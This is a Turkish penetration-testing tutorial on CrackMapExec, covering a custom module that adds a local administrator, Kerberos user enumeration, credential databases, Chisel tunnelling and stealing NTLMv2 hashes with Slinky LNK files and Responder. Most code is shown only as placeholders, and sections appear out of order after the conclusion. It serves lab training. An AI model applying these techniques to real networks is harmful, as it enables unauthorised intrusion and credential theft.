
{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus

```

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

